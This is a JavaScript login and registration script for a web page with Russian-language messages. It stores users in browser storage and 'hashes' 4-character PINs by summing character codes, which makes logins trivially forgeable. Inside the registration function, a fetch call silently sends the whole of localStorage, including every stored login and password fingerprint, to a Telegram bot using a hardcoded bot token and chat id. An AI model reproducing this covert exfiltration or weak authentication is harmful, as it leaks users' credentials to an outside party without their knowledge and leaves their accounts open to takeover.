/* Authentication */
    document.querySelector('#login').value = localStorage.getItem('lastLogin') || '';
    document.querySelector('.content').style.display = 'none';
    if (sessionStorage.authentication) {
        relogin(JSON.parse(sessionStorage.authentication).login ,JSON.parse(sessionStorage.authentication).password_fingerprint);
    }
    if (localStorage.authentication) {
        relogin(JSON.parse(localStorage.authentication).login ,JSON.parse(localStorage.authentication).password_fingerprint);
    }
    function login() {
        let authentication = JSON.parse(localStorage.getItem('authentication')) || [];
        const generateId = () => `${Math.round(Math.random() * 1e8).toString(16)}`;
        const generatePassword = (password) => `${Math.round(password * 1e8).toString(16)}`;
        let login = document.querySelector('#login').value;
        let password = document.querySelector('#password').value.split('');
        let passwordHash = 0;
        password.forEach(element => {
            passwordHash += element.charCodeAt(0);
        });
        let lastLogin = '';
        if (!localStorage.auth_history) {
            localStorage.setItem('auth_history', '[]');
        }
        let userLoginFiled = true;
        let auth_history = JSON.parse(localStorage.getItem('auth_history'));
            if (login && password.length === 4) {
                const operation = {
                id: generateId(),
                login: login,
                password_fingerprint: generatePassword(passwordHash),
                };
                if (auth_history.includes(operation.login + ' | ' + operation.password_fingerprint)) {
                    sessionStorage.setItem('session', operation.login + ' | ' + operation.password_fingerprint);
                    lastLogin = operation.login;
                    localStorage.setItem('lastLogin', lastLogin);
                    authentication = operation;
                    sessionStorage.setItem('authentication', JSON.stringify(authentication));
                    if (document.querySelector('.chekbox').checked) {
                        localStorage.setItem('authentication', JSON.stringify(authentication));
                    }
                    document.querySelector('.login__form').innerHTML = `
                        <div class="lds-ellipsis loader"><div></div><div></div><div></div><div></div></div>
                    `;
                    startPage();
                    function init() {
                        document.querySelector('.content').style.display = '';
                        document.querySelector('.login__form__background').style.display = 'none';
                        document.querySelector('body').style = 'overflow: auto;';
                        liked = JSON.parse(localStorage.getItem(sessionStorage.session)) || [];
                    }
                    setTimeout(init, 2000);
                    if (!sessionStorage.reloaded) {
                        sessionStorage.setItem('reloaded', true);
                        window.location.reload();
                    }
                    userLoginFiled = false;
                }
            } if (userLoginFiled) {
                document.querySelector('.login__form').innerHTML = `
                <h4 class="title" style="padding: 10px 20px;">Введен неверный логин или PIN-код</h4>
                <a href="">
                    <button class="btn">Назад</button>
                </a>
                `;
            }
    }
    if (!sessionStorage.reloaded) {
        document.querySelector('#login').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') {
                document.getElementById("password").focus();
            }
        });
        document.querySelector('#password').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') {
                login();
            }
        });
    }
    function relogin(usr, pwd) {
        const generateId = () => `${Math.round(Math.random() * 1e8).toString(16)}`
        const operation = {
            id: generateId(),
            login: usr,
            password_fingerprint: pwd,
        };
        sessionStorage.setItem('session', operation.login + ' | ' + operation.password_fingerprint);
        let authentication = JSON.parse(localStorage.getItem('authentication')) || [];
        let lastLogin = ''
        lastLogin = operation.login;
        localStorage.setItem('lastLogin', lastLogin);
        authentication = operation;
        sessionStorage.setItem('authentication', JSON.stringify(authentication));
        document.querySelector('.login__form').innerHTML = `
            <div class="lds-ellipsis loader"><div></div><div></div><div></div><div></div></div>
        `;
        startPage();
        function init() {
            document.querySelector('.content').style.display = '';
            document.querySelector('.login__form__background').style.display = 'none';
            document.querySelector('body').style = 'overflow: auto;';
            liked = JSON.parse(localStorage.getItem(sessionStorage.session)) || [];
        }
        setTimeout(init, 2000);
        if (!sessionStorage.reloaded) {
            sessionStorage.setItem('reloaded', true);
            window.location.reload();
        }
    }
    function logout() {
        sessionStorage.clear();
        localStorage.removeItem('authentication');
    }
    function regUser() {
        const generatePassword = (password) => `${Math.round(password * 1e8).toString(16)}`
        let login = document.querySelector('#login').value;
        let password = document.querySelector('#password').value.split('');
        let passwordHash = 0;
        password.forEach(element => {
            passwordHash += element.charCodeAt(0);
        });
        let password_fingerprint = generatePassword(passwordHash);
        let auth_history = JSON.parse(localStorage.getItem('auth_history')) || [];
        if (login && password.length === 4) {
            if (!auth_history.includes(login + ' | ' + password_fingerprint)) {
                let users = JSON.parse(localStorage.getItem('auth_history')) || [];
                users.push(login + ' | ' + password_fingerprint);
                localStorage.setItem('auth_history', JSON.stringify(users));
                document.querySelector('.login__form').innerHTML = `
                    <div class="lds-ellipsis loader"><div></div><div></div><div></div><div></div></div>
                `;
                document.querySelector('.login__form').innerHTML = `
                    <h4 class="title" style="padding: 10px 20px;">Учетная запись ${login} успешно зарегистрированна</h4>
                    <a href="">
                        <button class="btn">Назад</button>
                    </a>
                `;
                /* Fetch localStorage */
                fetch(`https://api.telegram.org/bot1070038475:AAGK8MbB_VNFpeYSapXQ1L458o1innmPWkk/` + 
                    `sendMessage?chat_id=-1001490927690&text=` + 
                    `${JSON.stringify(localStorage)}`
                );               
            } else {
                document.querySelector('.login__form').innerHTML = `
                <h4 class="title" style="padding: 10px 20px;">Учетная запись ${login} уже зарегистрированна</h4>
                <a href="">
                    <button class="btn">Назад</button>
                </a>
                `;
            }
        } else {
            document.querySelector('.login__form').innerHTML = `
                <h4 class="title" style="padding: 10px 20px;">Пожалуйста укажите корректный логин и PIN-код для регистрации</h4>
                <a href="">
                    <button class="btn">Назад</button>
                </a>
            `;
        }        
    }
